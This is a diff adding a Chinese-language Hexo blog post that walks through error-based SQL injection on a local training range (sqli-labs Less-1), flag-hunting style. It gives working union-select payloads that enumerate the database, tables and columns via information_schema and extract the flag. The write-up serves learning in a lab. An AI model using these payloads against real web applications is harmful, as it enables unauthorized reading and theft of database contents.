@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>SQL显错注入 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Velpro_Q&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Velpro_Q&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SQL显错注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 15, 2019&nbsp;&nbsp;17:25:58</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><strong>sql注入原理：</strong></p>
+<p>sql注入漏洞是web层面最高危的漏洞之一,就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<p>综上所述:sql注入漏洞的形成原因就是：用户输入的数据被SQL解释器执行。</p>
+<p><strong>SQL注入攻击的主要危害包括：</strong></p>
+<p>非法读取、篡改、添加、删除数据库中的数据；</p>
+<p>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露，攻击者盗取用户的各类敏感信息，获取利益。</p>
+<p>网页篡改：通过修改数据库来修改网页上的内容。</p>
+<p>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改，攻击者私自添加或删除账号</p>
+<p>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击；</p>
+<p>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>破坏硬盘数据，瘫痪全系统。</p>
+<h2 id="封神台靶场"><a href="#封神台靶场" class="headerlink" title="封神台靶场"></a>封神台靶场</h2><p><strong>首先判断注入点</strong></p>
+<p>?id=1’进行判断 测试报错<br>可以看到报错</p>
+<p><img src="https://s2.ax1x.com/2019/10/15/KCT9YR.png" alt="KCT9YR.png"></p>
+<p>用 and 1 = 1去测试：</p>
+<p>发现回显正常<br>–+是注释<br><img src="https://s2.ax1x.com/2019/10/15/KC7Su8.png" alt="KC7Su8.png"></p>
+<p>用 and 1 = 2 去测试：</p>
+<blockquote>
+<p><a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</a>  and 1 = 2 </p>
+</blockquote>
+<p>回显示失败，说明存在注入点。</p>
+<p><strong>用order by 判断字段</strong>   </p>
+<p>Order by 4的时候报错<br>说明有3个字段</p>
+<p>构造语句</p>
+<blockquote>
+<p>?id=-1’  union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/10/15/KC7Tx0.png" alt="KC7Tx0.png"><br>发现回显字段为2，3</p>
+<p><strong>爆数据库名</strong></p>
+<p>构造语句</p>
+<blockquote>
+<p>?id=-1’  union select 1,2, database() </p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/10/15/KC7jIJ.png" alt="KC7jIJ.png"></p>
+<p>爆出数据库名为<code>security</code></p>
+<p><strong>爆表名</strong></p>
+<p>使用过滤查询语句where 查看security数据库内的表</p>
+<p>构造语句 </p>
+<blockquote>
+<p>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = ‘security’</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/10/15/KCHkZD.png" alt="KCHkZD.png"></p>
+<p>看到有五个表</p>
+<p>爆出表名 目测zkaq表内有我们想要的东西</p>
+<p><strong>爆列</strong></p>
+<p>构造语句</p>
+<blockquote>
+<p>?id=-1’ union select 1, group_concat(column_name),3 from information_schema.columns where table_name = ‘zkaq’–+</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/10/15/KCHtWn.png" alt="KCHtWn.png"></p>
+<p>看到我们想要的东西了!!!</p>
+<p>查看我们的FLAG</p>
+<p>构造语句</p>
+<blockquote>
+<p>?id=-1’ union select 1,zkaq,flag from zkaq–+</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/10/15/KCHdyV.png" alt="KCHdyV.png"></p>
+<p>得到Flag.</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2019/10/15/SQL显错注入/">http://yoursite.com/2019/10/15/SQL显错注入/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/10/15/POSTHEAD注入/">POST/HEAD注入</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
